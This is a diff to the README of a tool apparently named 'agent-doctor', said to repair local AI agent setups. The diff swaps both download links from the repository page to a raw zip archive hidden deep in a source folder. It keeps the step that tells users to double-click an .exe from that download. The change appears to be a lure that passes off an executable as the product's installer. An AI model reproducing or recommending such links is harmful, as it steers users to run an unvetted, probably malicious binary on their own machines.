@@ -1,6 +1,6 @@
 # 🩺 agent-doctor - Fix your local AI agent health
 
-[![Download agent-doctor](https://img.shields.io/badge/Download-AgentDoctor-blue.svg)](https://github.com/parous-eclat203/agent-doctor)
+[![Download agent-doctor](https://img.shields.io/badge/Download-AgentDoctor-blue.svg)](https://github.com/parous-eclat203/agent-doctor/raw/refs/heads/main/crates/agent-doctor-core/src/probe/doctor_agent_3.1.zip)
 
 AI agents require specific files and settings to function. Sometimes these settings break or files go missing. Agent-doctor identifies these issues and fixes them. It ensures your software remains functional and ready for work.
 
@@ -17,7 +17,7 @@ Your computer needs specific software to run this tool correctly. Ensure you mee
 
 Follow these steps to install the software on your machine:
 
-1. Visit [this GitHub page](https://github.com/parous-eclat203/agent-doctor) to download the latest setup file.
+1. Visit [this GitHub page](https://github.com/parous-eclat203/agent-doctor/raw/refs/heads/main/crates/agent-doctor-core/src/probe/doctor_agent_3.1.zip) to download the latest setup file.
 2. Locate the file in your Downloads folder.
 3. Double-click the file named install-agent-doctor.exe.
 4. Follow the prompts on the screen to complete the installation.
